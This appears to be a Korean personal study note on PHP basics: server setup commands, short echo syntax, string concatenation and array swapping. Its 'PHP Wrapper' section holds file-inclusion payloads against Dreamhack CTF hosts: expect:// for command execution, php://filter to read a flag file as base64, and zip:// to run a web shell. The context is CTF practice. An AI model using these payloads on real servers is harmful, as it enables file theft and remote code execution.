# 서버구축
아래는 리눅스(ubunut22.04-apt사용) 환경에서 php 서버를 구축하는 명령어들
```SH
sudo apt update & sudo apt upgrade 
sudo apt install apache2 php php-mysql mysql-server -y
sudo service apache2 start
```


# 기본 문법
`<?=`
`<?=` 는 PHP에서 사용되는 짧은 형태의 echo 문법
`<?=` 는 `<?php echo` 와 동일한 역할을 수행

```PHP
<?=`ls`?>	   /*<?php echo ls?> 랑 동일*/
```

문자열 사이에 .
문자열 사이에 .은 양쪽의 문자열을 이어주는 역할을 한다.

```PHP
$_GET['page'].'.php' /*쿼리로 받은 page 문자열에 .php 문자열을 붙임*/
```

# 슈퍼글로벌변수

```PHP
$_SESSION['username']
```


# PHP Wrapper

- expect://
system command를 실행시켜 줌
```
http://host3.dreamhack.games:18957/?file=expect://ls
```

- php://filter
encode / decode 옵션으로 서버 안에 존재하는 문서를 열람할 수 있음
```
http://host3.dreamhack.games:18957/?page=php://filter/page=convert.base64-encode/resource=/var/www/uploads/flag
```

```
http://host1.dreamhack.games:9636/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag
```

base64로 인코딩하여 php 스크립트 자체를 가져오기
```
http://host3.dreamhack.games:14072/?page=php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag
```


- zip://
zip파일의 압축을 풀고 해당파일을 실행(웹쉘 응용)
```
?page_num=zip://file.zip#web_shell.php
```


# Destucturing? Python 처럼 Swap 가능
- swap 관련 구현체 보다가 알게된건데, 파이썬처럼 `[$ret[$i], $ret[$p]] = [$ret[$p], $ret[$i]];` 이렇게 사용할 수 있음
``` php
function draw($n, $k) {
    $ret = range(1, $n);
    for ($i = 0; $i < $n - 1; $i++) {
        $p = rand($i, $n - 1);
        [$ret[$i], $ret[$p]] = [$ret[$p], $ret[$i]];
    }
    $ret = array_slice($ret, 0, $k);
    sort($ret);
    return $ret;
}
```

